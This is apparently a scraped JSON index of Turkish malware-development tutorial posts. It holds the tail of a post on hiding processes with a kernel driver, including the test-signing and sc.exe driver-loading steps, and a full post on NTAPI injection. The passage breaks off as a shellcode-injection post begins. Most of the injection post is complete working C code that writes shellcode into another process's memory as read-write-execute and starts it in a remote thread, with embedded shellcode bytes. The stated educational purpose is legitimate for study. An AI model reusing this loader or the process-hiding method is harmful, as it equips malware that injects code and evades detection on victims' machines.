GetLastError()); CloseHandle(HandleNewProcess); return -1; } printf(\"[+] The Process has been Hidden!\\n\"); Process’in oluşturulma sonrasında alınan handle değeriyle PID değerini alıyoruz ve HANDLE tipiyle ProcessID değişkenine aktarıyoruz. HANDLE tipiyle alma nedenimiz ise kernel tarafında PID değerleri HANDLE tipinde tutulduğu için çeviriyoruz.\nDaha sonra tekrar ConnectDriver fonksiyonunu IOCTL_HIDE_PROCESS kodu ile çağırarak process’i gizlemesi için talimat gönderiyoruz ve oluşturulan Process gizlenmiş oluyor.\nMalware’in çalıştırılması Eğer projeyi denemek istiyorsanız WinDbg bağlı bir sanal makine windows 10/11 kullanmanızı öneririm. Sistemde kalıcı kalıntılar bırakıldığından dolayı local sistemde çalıştırmanızı önermiyorum.\nProjeyi sanal makinede çalıştırmadan önce windows’un test ortamında çalıştırmanız gerekecektir. Aşağıdaki kod ile test modunu aktifleştirebilirsiniz:\nbcdedit /set testsigning on Daha sonra işletim sistemini yeniden başlatın.\nYeniden başlattıktan sonra cmd.exe’yi admin yetkisiyle çalıştırın ve sürücüyü sisteme yükleyin:\nsc.exe create resurrection type=kernel binPath=\"\\\\path\\\\to\\\\driver\\\\resurrection.sys\" start=demand Daha sonra sürücüyü başlatın:\nsc.exe start resurrection Son olarak dinleme işlemi için bir notepad veya paint gibi uygulama başlatabilirsiniz. Çalıştırdığınız bu programın PID değerini alın ve user-mode programına verin:\n.\\\\program.exe \u003cPID\u003e Daha sonra sonuçları gözlemleyebilirsiniz.\nSonuç Bu projede, kernel-mode sürücü ve user-mode programı kullanarak malware’in gizli bir klasörde saklanmasını ve bir process oluşturulmasını ve gizlenmesini sağladık. Umarım bu tekniği anlamınızda yardımcı olmuştur.\nBunu söylemekten sıkılmayacağım ancak bunun bir eğitim amaçlı olduğunu ve kötü amaçlı kullanıma teşvik etmediğimi tekrar belirtmek isterim.\nHepinize iyi çalışmalar dilerim 🚀🚀🚀","user-mode-program#User Mode Program":""},"title":"Malware Resurrection"},"/docs/malware-dev/ntapi-injection/":{"data":{"":"","ntapi-ile-shellcode-çalıştırma#NTAPI ile Shellcode Çalıştırma":"","ntapi-injection-nedir#\u003cstrong\u003eNTAPI Injection Nedir?\u003c/strong\u003e":"","ntapi-nedir#\u003cstrong\u003eNTAPI Nedir?\u003c/strong\u003e":"","sonuç#Sonuç":"Merhabalar. Bu blogta NTAPI Injection konusunu öğreneceğiz.\nUser mode ve Kernel Mode Tekniğe geçmeden önce bazı temel şeyleri anlamamız gerekiyor ve User-Mode ve Kernel-Mode nedir bunlara bir göz atalım.\nWindows işletim sistemi, temel olarak iki farklı çalışma alanı sunar: user mode (kullanıcı modu) ve kernel mode (çekirdek modu). Bu ayrım, işletim sisteminin güvenliğini, işleyişinin düzenlenmesi ve kaynakların verimli bir şekilde kullanılması üzerine kuruludur. Her iki alan da farklı roller üstlenir ve birbirini tamamlar.\nUser mode (Ring 3), işletim sisteminde çalışan uygulamalar ve process’ler için ayrılmış bir alandır. Bu modda çalışan process’ler, sistem kaynaklarına ve donanıma doğrudan erişemez. Bunun yerine, işletim sisteminin kernel modunda çalışan çekirdek bileşenlerine çağrılar yapar. Bu çağrılar, genellikle WinAPI ve asıl konumuz olan ve daha alt seviyede NTAPI üzerinden gerçekleştirilir. User mode alanın diğer özellikleri:\nKullanıcı uygulamalarının çalıştığı güvenli bir alan sağlar. Çökme durumunda yalnızca ilgili uygulamayı etkiler, sistemin tamamını etkilemez. Donanım erişimi için kernel mode’a geçiş yapması gerekir. Kernel mode (Ring 0) ise işletim sisteminin çekirdeği ve donanımla doğrudan iletişimde olan bileşenlerin çalıştığı alandır. Bu modda çalışan driver’lar, sistem üzerinde tam kontrole sahiptir yani user-mode alanına kıyasla daha fazla ayrıcalığa ve güce sahiptir. Ancak bu güç, beraberinde büyük bir sorumluluk getirir: Kernel modunda oluşan hatalar tüm sistemi etkileyebilir ve çökmesine neden olabilir. Kernel mode alanın diğer özellikleri:\nDonanıma ve sistem kaynaklarına doğrudan erişim sağlar. Güvenlik önlemleri ve hata toleransı açısından daha az izole bir ortamdır. NTAPI çağrılarının işlenip yürütüldüğü seviyedir. NTAPI Nedir? Eğer önceki DLL Injection ve Shellcode Execution blog yazılarımı takip ettiyseniz, bu tekniklerde kodlarımızı çalıştırmak için genellikle WinAPI işlevlerini kullandığımızı hatırlarsınız. Ancak WinAPI, Windows işletim sisteminin daha kullanıcı dostu bir katmanını temsil eder ve temelinde NTAPI (Native API) yer alır.\nNTAPI, Windows’un hem kernel mode (çekirdek modu) hem de user mode (kullanıcı modu) uygulamaları tarafından kullanılan hafif ve düşük seviyeli bir programlama arayüzüdür. WinAPI’nin arka plandaki işleyişi büyük ölçüde NTAPI’ye dayanır. Örneğin, WinAPI işlevlerini gerçekleştiren birçok alt program, kernel32.dll gibi kütüphaneler aracılığıyla NTAPI çağrılarını kullanır.\nKafanıza daha iyi oturmak için bir senaryo oluşturalım. Diyelim ki user mode programından OpenProcess’i çağırdığımızı varsayalım. Aşağıdaki diyagramda gösterilen işlemler gerçekleşecektir:\nDiyagramımıza göz attığımızda User mode programın çağırdığı OpenProcess API’si ilk olarak kernel32.dll‘de kütüphanesine yönleniyor ve artık bu modun son durağı olan ntdll.dll kütüphanesine yöneldiğinde NtOpenProcess’e dönüştüğünü görüyoruz. ntdll.dll kütüphanesi user-mode alanı için son duraktır ve artık bundan sonraki akış kernel alanında devam edecek.\nKernel alanında ise ilk olarak SSDT dediğimiz tabloya yönlendiriliyor Burada SSDT anlatarak kafanızı çok bulandırmak istemiyorum zira biraz ileri seviye ve kafa karıştırıcı bir konu. Ancak kafanızda kalması için şu şekilde düşünebilirsiniz: SSDT (System Service Descriptor Table), user mode’dan yapılan sistem çağrılarının kernel mode’daki doğru API’lara yönlendirilmesini sağlayan bir köprü görevi görür. Bu tablo, çağrılan Native API’ları alır ve kernel mode’da, ntoskrnl.exe içindeki ilgili adreslere yönlendirir. Eğer SSDT yakından tanımak isterseniz SSDT ile ilgili bloguma göz atabilirsiniz.\nSSDT tablosundan sonra ise ntoskrnl.exe içerisinden NtOpenProcess’in adresine yönlendirilerek işlemlerin tamamlandığını görebiliriz.\nBunu canlı bir şekilde görmemiz de mümkün. Visual Studio’da sadece OpenProcess’i çağırdığımız proje oluşturalım ve ardından Windbg’da analiz ederek nelere dönüştüğüne göz atalım:\nUser-mode alanında son durak olan ntdll.dll’e bir breakpoint koyup programı çalıştırdıktan sonra Call Stack’e göz attığımızda ilk başta KERNELBASE!OpenProcess‘in çağırıldığını ve sonra ntdll!NtOpenProcess çağırıldığını görebiliriz. ntdll.dll’den sonra akış kernel alanında devam edecek.\nNTAPI Injection Nedir? Artık temel bilgilerden sonra asıl konumuza gelebiliriz.\nNTAPI Injection tekniği, ntdll.dll tarafından sağlanan Windows Native API ile doğrudan etkileşim kurmayı içerir. Yani bu teknikten yararlanan bir malware, daha yüksek seviyeli Windows API’lar kullanmak yerine ntdll.dll’den daha düşük seviyeleri kullanır. Örneğin malware’da OpenProcess çağırılmaz ve direkt olarak alt seviyesi olan NtOpenProcess çağırılır.\nTekniği daha yakından anlamak için basit bir kodlama yapalım. Bunun için user-mode alanından direkt olarak ntdll.dll’den bir NTAPI nasıl çağırılır buna bakalım. Örneğimiz NtOpenProcess olacak.\nÖncelikle kodlamaya geçmeden hazırlık yapmamız gerekiyor. Direkt olarak daha düşük seviyeli API’lar çağıracağımızdan ve bunlar user-mode alanları için tanımlanmadığından kendimiz tanımlayıp ardından adresini alarak çağırmamız gerekecek.\nİlgili NTAPI oluşturmak için benim de sıklıkla yararlandığım NtDoc gibi sitelerden yararlanabiliriz:\nProjenizde kullanmak istediğiniz NTAPI aratarak yapıya ulaşabiliriz. Bizim amacımız projede NtOpenProcess çağırmak olduğu için bunu aratalım:\nGöründüğü gibi NtOpenProcess API’i dört parametre aldığını görebiliriz:\nNTSYSCALLAPI NTSTATUS NTAPI NtOpenProcess( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ PCOBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId ); Hatırlarsanız OpenProcess fonksiyonu üç parametre alırken alt seviyesi olan NtOpenProcess dört parametre almakta. Ayrıca OpenProcess’e kıyasla iki parametre farklı.\nŞimdi bu aldığımız yapıyı projemize ekleyelim:\nYapıyı projemize eklediğimizde son iki yapılar için hata verdiğini göreceksiniz. Bunlar da usermode alanı için tanımlı olmadığından ntdoc gibi sitelerden bu yapıları tanımlamamız gerekecek. Sitede CLIENT_ID ve OBJECT_ATTRIBUTES diye aratarak yapıları ekleyebiliriz:\nBu iki yapıdan sonra hata aldığınız diğer yapıları da siteden aratarak tanımlayın. Böylece alışmış olursunuz.\nKodlamaya geçmeden önce son olarak NTSTATUS’u da tanımlamamız gerekecek. NTAPI’ların dönüş adresi NTSTATUS dediğimiz tipte olduğu için bunu da tanımlayıp NTSTATUS değerlerine göre başarılı olup olmadığını göreceğiz:\ntypedef _Return_type_success_(return \u003e= 0) long NTSTATUS; Bunu da projemize ekleyelim. Artık kodlamaya geçebiliriz:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef const UNICODE_STRING* PCUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PCUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR; PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* NtOpenProcess)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Kullanim: program.exe \u003cPID\u003e\\n\"); return -1; } DWORD PID = atoi(argv[1]); HMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); NtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); HANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); return 0; } Kod parçamız bu şekilde. Detaylıca göz atalım:\nHMODULE NTDLL = GetModuleHandleW(L\"ntdll.dll\"); if (NTDLL == NULL) { printf(\"NTDLL'in adresi alinamadi!\\n\"); return -1; } printf(\"NTDLL adresi: 0x%p\\n\", NTDLL); main içerisinde ilk olarak ntdll.dll’in adresini alarak başlıyoruz. ntdll’in adresini aldıktan sonra bu kütüphane içerisinden NtOpenProcess’in adresine ulaşacağız.\nNtOpenProcess NtOpenProcessAddress = (NtOpenProcess)GetProcAddress(NTDLL, \"NtOpenProcess\"); if (NtOpenProcessAddress == NULL) { printf(\"NtOpenProcess adresi alinamadi!\\n\"); return -1; } printf(\"NtOpenProcess adresi: 0x%p\\n\", NtOpenProcessAddress); ntdll’in adresini aldıktan sonra GetProcAddress ile ntdll içerisinden NtOpenProcess’in adresini alıyoruz ve projede oluşturduğumuz NtOpenProcess yapısına bu adresi veriyoruz.\nHANDLE HandleProcess = NULL; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != 0) { printf(\"NtOpenProcess fonksiyonu basarisiz oldu! Status: 0x%08x\\n\", Status); return -1; } printf(\"NtOpenProcess fonksiyonu basarili!\\n\"); Son olarak ise NtOpenProcess’i çağırıyoruz. Ancak ondan önce OBJECT_ATTRIBUTES ve CLIENT_ID yapılarını tanımlıyoruz.\nŞu kısma da dikkat edin, OpenProcess’te PID değeri direkt olarak DWORD ile verilirken NtOpenProcess direkt olarak PID değerini almıyor ve CLIENT_ID’in birinci elemanı ve HANDLE tipinde olan UniqueProcess’e veriliyor.\nGözümüz bu kısımdaki if koşuluna kaysın. User mode WinAPI’larına kıyasla NTSTATUS tipinde sonuç döndüren NTAPI’larda eğer 0 sonucunu döndürürse başarılı olduğunu gösterir. Bu yüzden koşulda eğer sonuç olarak 0’dan farklı bir değer döndürüyorsa hata durumunu ekrana bastırıyoruz.\nProgramı direkt olarak çalıştırıp sonucu görmek yerine daha detaylı analiz ederek arka planda neler olduğuna bir tekrar bakalım. Windbg’a kodladığımız .exe dosyasını verelim:\nDebug button’a basdıktan sonra main fonksiyona bir bp koyup çalıştıralım:\nWindbg’ın üst kısmından View \u003e Dissassembly seçeceğini aktifleştirelim ve gelen ekrandan main fonksiyonun disassembly haline göz atalım:\nmain fonksiyona göz atarken ilk olarak GetModuleHandeW ile aldığımız ntdll’in adresine göz atarak başlayabiliriz. GetModuleHandleW çalıştıktan sonraki kısma bir bp koyup rax’ın ne değer aldığına bir bakalım:\nGetModuleHandleW çalıştıktan sonra rax’ın aldığı değere göz attığımızda ntdll.dll’in başlangıç adresine işaret ettiğini doğrulayabiliriz.\nSonraki durağımız GetProcAddress ile NtOpenProcess’in adresi alındığı kısım olacak:\nAynı şekilde GetProcAddress çalıştıktan sonraki kısma bir bp koyalım ve rax’ın aldığı değere göz atalım:\nGörüldüğü üzere GetProcAddress’in çalışmasıyla 00007ffc`7c6dfbd0 adresi elde ediliyor ve adresi kontrol ettiğimizde ntdll içerisinden NtOpenProcess olduğunu görebiliyoruz.\nŞimdi ise son olarak odağımızı NtOpenProcess’i çağırdığımız noktaya çevirelim:\nBu kısımda NtOpenProcess için parametrelerin hazırlandığını ve daha sonradan NtOpenProcess’i çağırdığını görebiliriz. Ancak bir şeyin dikkatinizi çekmesini istiyorum: parametreler ters olarak hazırlanmış. Sembol isimlerine bakarsanız ilk olarak CID yapısının hazırlandığını ve r9 register’a verildiğini ve en son olarak rcx register’a HandleProcess’in adresini verildiğini göreceksiniz.\nOpenProcess gibi WIN32 API'lar stdcall çağırma kurallarını kullanır. Daha iyi anlamak için Microsoft Learn dökümanından yararlanabiliriz:\n“Win32 API işlevlerini çağırmak için __stdcall çağrı kuralı kullanılır. Çağıran kişi yığını temizler, bu nedenle derleyici vararg işlevlerini __cdecl yapar. Bu çağırma kuralını kullanan fonksiyonlar bir fonksiyon prototipi gerektirir. stdcall değiştiricisi Microsoft’a özgüdür.”\nWIN32 API’lar stdcall çağrı kuralını kullandığı için parametreler sağdan sola doğru hazırlanır:\nDaha iyi anlamak için C kodumuza tekrar dönelim:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); Her ne kadar projede NtOpenProcess’in parametrelerini böyle hazırlasak da, OpenProcess stdcall kuralına dahil olduğu için arka planda bu parametreler sağdan sola hazırlanacaktır. Yani şu şekilde:\nNTSTATUS Status = NtOpenProcessAddress(\u0026CID, \u0026ObjAttr, PROCESS_ALL_ACCESS, \u0026HandleProcess); Yine parametrelere hazırlanırken r9 gibi register’lara hazırlandığını göreceksiniz. Bu register’lar rastgele kullanılmıyor yine Windows’un x64 Calling Convention ile ilgili:\n“İlk dört sıradaki tam sayı (integer) türündeki argümanlar sırasıyla RCX, RDX, R8 ve R9 kayıtlarına atanır. Beşinci ve daha sonraki argümanlar, yukarıda belirtildiği şekilde yığıta aktarılır.”\nFonksiyonun ilk dört parametresi rcx, rdx, r8 ve r9 register’lara aktarılır. Eğer dörtten fazla parametre barındırıyorsa diğerleri stack’e aktarılıyor. Daha iyi anlamak için NtOpenProcess’e yönelirsek, aşağıda gösterildiği gibi hazırlanacaktır:\nNTSTATUS Status = NtOpenProcessAddress(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); // r9 = \u0026CID, r8 = \u0026ObjAttr, rdx = PROCESS_ALL_ACCESS (1FFFFFh), rcx = \u0026HandleProcess Ayrıca Disassembly ekranına tekrar bakarsak bunu doğrulayabiliriz:\nArtık main içerisinde NtOpenProcess’i çağırdığımız kısma bir bp koyalım ve programı p ile devam ettirerek NtOpenProcess’in döndürdüğü değere bakalım:\nNtOpenProcess çalıştıktan sonra 0 değeri döndürdü. Ne demiştim hatırlayalım: NTSTATUS tipinde dönüş yapan Native API’lar, eğer 0 döndürürse başarılı olduğunu gösterir.\nProjede yaptığımız işlemlerin diyagramını hazırlayalım:\nİlk diyagramdan hatırlarsanız ilk durağımız kernel32.dll’di ancak projemizde bu kısmı atlayarak programda ntdll.dll’den NtOpenProcess’e ulaşıyoruz.\nNTAPI ile Shellcode Çalıştırma Artık NTAPI Injection tekniğinde neler yaptığımızı biliyoruz. Shellcode Execution projemizde yaptığımız adımları yapacağız ancak farklı olarak NTAPI kullanacağız.\nÖncelikle projede utils.h header oluşturalım ve aşağıdaki kodları yapıştıralım:\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e #pragma once #define STATUS_SUCCESS (NTSTATUS)0x00000000L #pragma region STRUCTURES typedef struct _OBJECT_ATTRIBUTES { ULONG Length; VOID* RootDirectory; struct _UNICODE_STRING* ObjectName; ULONG Attributes; VOID* SecurityDescriptor; VOID* SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE { ULONGLONG Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef NTSTATUS(NTAPI* fn_NtOpenProcess) ( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory) ( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory) ( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx) ( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); typedef NTSTATUS(NTAPI* fn_NtWaitForSingleObject) ( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* fn_NtClose) ( IN HANDLE Handle ); #pragma endregion Ardından main.c projemizi kodlayalım:\n#include \"utils.h\" /* cmd.exe /K \"echo NTAPI Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x4e\\x54\\x41\\x50\\x49\\x20\\x49\\x6e\\x6a\\x65\" \"\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\\x20\\x62\\x65\\x6b\" \"\\x6f\\x6f\\x22\\x00\"; size_t ShellcodeSize = sizeof(Shellcode); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\injection.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; HMODULE ntDLL = NULL; PVOID RemoteBuffer = NULL; size_t bytesWritten = 0; OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = STATUS_SUCCESS; /* Get handle to ntdll and kernel32 */ ntDLL = GetModuleHandleA(\"ntdll.dll\"); if (ntDLL == NULL) { printf(\"Failed to get handle for NTDLL! Error Code: 0x%lx\\n\", GetLastError()); return -1; } /* NtCloseHandle */ fn_NtClose ntClose = (fn_NtClose)GetProcAddress(ntDLL, \"NtClose\"); /* NTOpenProcess */ fn_NtOpenProcess ntOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntDLL, \"NtOpenProcess\"); Status = ntOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026objAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"Failed to open handle to Process! Error Code: 0x%lx\", Status); return -1; } /* NTAllocateVirtualMemory */ fn_NtAllocateVirtualMemory ntAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntDLL, \"NtAllocateVirtualMemory\"); Status = ntAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"Failed to Allocate Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NTWriteVirtualMemory */ fn_NtWriteVirtualMemory ntWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntDLL, \"NtWriteVirtualMemory\"); Status = ntWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), \u0026bytesWritten); if (Status != STATUS_SUCCESS || bytesWritten != sizeof(Shellcode)) { printf(\"Failed to Write Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtCreateThreadEx */ fn_NtCreateThreadEx ntCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntDLL, \"NtCreateThreadEx\"); Status = ntCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, \u0026objAttr, HandleProcess, (RemoteBuffer), NULL, FALSE, 0, 0, 0, 0); if (Status != STATUS_SUCCESS) { printf(\"Failed to create Thread! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtWaitForSingleObject */ fn_NtWaitForSingleObject ntWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddress(ntDLL, \"NtWaitForSingleObject\"); Status = ntWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"Failed to wait for Thread! Error Code: 0x%lx\", Status); ntClose(HandleThread); ntClose(HandleProcess); return -1; } ntClose(HandleThread); ntClose(HandleProcess); return 0; } Artık bu kodlarda neler yaptığımızı biliyoruz o yüzden kodların detayına girmeyeceğim. Projeyi çalıştıralım:\nVideodan görüldüğü üzere NTAPI’lar kullanarak başarılı bir şekilde Shellcode execute edebiliyoruz.\nSonuç Bu konuda NTAPI’lara yakından değindik. User-mode ve Kernel-mode alanlarını teorik olarak tanıdık ve ardından NTAPI’lar üzerinde çalışma yaptık ve son olarak NTAPI’lar kullanarak Shellcode Exeucute ettik.\nUmarım konu sizin için faydalı olmuştur. Diğer blogta görüşmek üzere.","user-mode-ve-kernel-mode#\u003cstrong\u003eUser mode\u003c/strong\u003e ve \u003cstrong\u003eKernel Mode\u003c/strong\u003e":""},"title":"NTAPI Injection"},"/docs/malware-dev/shellcode-injection/":{"data":{"":"","kod#Kod":"\nMerhabalar bu yazıda Shellcode Execution konusunu inceleyeceğiz.\nNedir bu Process’ler Maldev alanının ilk konusu olduğu için bazı temel şeyleri öğrenerek başlamamız gerekiyor.\nKabaca Processler, işletim sistemi tarafından herhangi bir programın yürütülmesi için oluşturulan çalışma birimleridir. Eğer bir program, kullanıcı veya İşletim Sistemi (OS) tarafından çalıştırılmak istenirse, öncelikle İşletim Sistemi tarafından belleğe yüklenir ardından yine İşletim Sistemi tarafından bu programın yürütülmesi için bir process oluşturulur. En sonda ise belleğe yüklenen programın bellek alanı, Process tarafından temsil edilir ve programın içerdiği komutları çalıştırılmaya başlanır.\nArayüz ortamında gördüğünüz herhangi bir programın dosyaları (kabaca program kodları), kullanıcı veya işletim sistemi tarafından çalıştırılmadığı sürece pasif halde olur. Eğer hedef program çalıştırılmak istenirse, önce diskten belleğe aktarılır ardından aktarılan bu kodlar yürütülmeye başlanır. Bu esnada ise program aktif hale gelmiş olur.\nThread’ler Nedir? “Bir Process, en basit ifadeyle, yürütülmekte olan bir programdır. Process bağlamında bir veya daha fazla thread çalışır. Thread ise işletim sisteminin işlemci zamanını tahsis ettiği temel birimdir. Bir Thread, başka bir thread tarafından yürütülmekte olan kısımlar da dahil olmak üzere, işlem kodunun herhangi bir bölümünü yürütebilir.” Microsoft Learn - Process and Threads Process’lere göre daha hızlı ve hafif olan Thread’ler, kabaca tanımıyla İşletim Sisteminde bağımsız olarak çalışan birimlerdir. Herhangi bir process içerisinde bir veya daha fazla thread olabilir. Dolayasıyla Process’ler, Thread’ler sayesinde birden fazla işi aynı anda yapabilir.\nThread aracılığıyla Process’lerin birden fazla işi aynı anda yapılabileceğinden bahsettim. Bunu biraz daha detaylandıralım. Örneğin bir web tarayacısı düşünün. Bu web tarayıcısının bir thread ile kullanıcının arayüzle etkileşimi yönetilirken diğer thread’ler ile arka planda web sayfaları yüklemek gibi işlemleri aynı anda gerçekleştirebilir. Örnek açısından aşağıda Windows 11 ortamında Task Manager aracılığıyla Firefox Process’in altındaki Thread listesi gösterilmiştir: Shellcode Execution Nedir? Shellcode Execution genellikle process injection teknikleriyle ilişkilidir. Saldırgan, shellcode’u bir hedef sürecin belleğine enjekte ettikten sonra, bu kodun çalıştırılmasını sağlayarak hedef sistemde kontrol elde edebilir.\nKod Github üzerinde paylaştığım örnek kod parçasına buradan erişebilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e /* cmd /K \"echo Shellcode Injection with bekoo\" */ char Shellcode[] = 